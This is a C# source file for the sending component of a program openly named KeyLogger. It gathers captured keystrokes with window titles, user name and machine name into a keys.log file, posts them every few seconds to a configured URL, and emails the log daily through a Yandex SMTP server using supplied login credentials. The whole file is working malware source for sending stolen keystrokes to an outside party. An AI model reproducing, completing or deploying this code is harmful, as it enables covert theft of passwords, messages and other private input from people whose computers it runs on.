using System;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
    class Sender
    {
        string url;
        string from_login, from_pass, to_login;
        string userName;
        string machineName;
        string data = "";
        bool sendingPostRequest = false;
        bool sendingEmail = false;
        string queue = "";
        DateTime lastEmailSend, lastSendPostRequest;

        public Sender(string url, string from_login, string from_pass, string to_login)
        {
            this.url = url;
            this.from_login = from_login;
            this.from_pass = from_pass;
            this.to_login = to_login;
            userName = Environment.UserName;
            machineName = Environment.MachineName;
            if (!File.Exists("keys.log"))
            {
                File.WriteAllText("keys.log", $"[USER = \"{userName}\", MACHINE = \"{machineName}\"]");
            }
            else
            {
                TrySendEmail();
            }
            lastEmailSend = DateTime.Now;
        }

        public void Add(string windowName, string buf)
        {
            data += $" [WINDOW = \"{windowName}\"] {buf}";
            queue += "\n\n" + $"[WINDOW = \"{windowName}\"]" + "\n\n" + buf;
            if (!sendingEmail)
            {
                File.AppendAllText("keys.log", queue);
                queue = "";
            }
            Console.WriteLine("Added new data.");
        }

        public void Update()
        {
            if ((DateTime.Now - lastSendPostRequest).Seconds > 5) TrySendPostRequest();
            if ((DateTime.Now - lastEmailSend).Days > 0) TrySendEmail();
        }

        void TrySendPostRequest()
        {
            if (!sendingPostRequest && data != string.Empty) SendPostRequestAsync();
        }

        async void SendPostRequestAsync()
        {
            sendingPostRequest = true;
            string pData = data;
            data = string.Empty;
            Console.WriteLine("Sending post request...");
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Method = "POST";
                byte[] byteArray = System.Text.Encoding.UTF8.GetBytes(
                    $"[USER = \"{userName}\", MACHINE = \"{machineName}\"]{pData}"
                );
                request.ContentType = "application/json";
                request.ContentLength = byteArray.Length;
                using (Stream dataStream = request.GetRequestStream())
                {
                    dataStream.Write(byteArray, 0, byteArray.Length);
                }
                request.Timeout = 3000;
                WebResponse response = await request.GetResponseAsync();
                response.Close();
                Console.WriteLine("Successful sending post request");
            }
            catch
            {
                data = pData + data;
                Console.WriteLine("Error sending post request");
            }
            lastSendPostRequest = DateTime.Now;
            sendingPostRequest = false;
        }

        public void TrySendEmail()
        {
            if (!sendingEmail)
            {
                SendEmailAsync();
            }
        }

        public async void SendEmailAsync()
        {
            Console.WriteLine("Sending email..");
            sendingEmail = true;
            try
            {
                MailAddress from = new MailAddress(from_login, "Keylogger");
                MailAddress to = new MailAddress(to_login);
                using (MailMessage m = new MailMessage(from, to))
                {
                    m.Attachments.Add(new Attachment("keys.log"));
                    m.Subject = userName + " " + machineName;
                    m.Body = $"USER = \"{userName}\"\n MACHINE = \"{machineName}\"";
                    using (SmtpClient smtp = new SmtpClient("smtp.yandex.ru", 587))
                    {
                        smtp.Credentials = new NetworkCredential(from_login, from_pass);
                        smtp.EnableSsl = true;
                        smtp.Timeout = 5000;
                        Attachment at = new Attachment("keys.log");
                        m.Attachments.Add(at);
                        await smtp.SendMailAsync(m);
                    }
                }
                File.WriteAllText("keys.log", $"[USER = \"{userName}\", MACHINE = \"{machineName}\"]");
                
                Console.WriteLine("Successful sending email");
            }
            catch
            {
                Console.WriteLine("Error sending email");
            }
            lastEmailSend = DateTime.Now;
            sendingEmail = false;
        }
    }
}
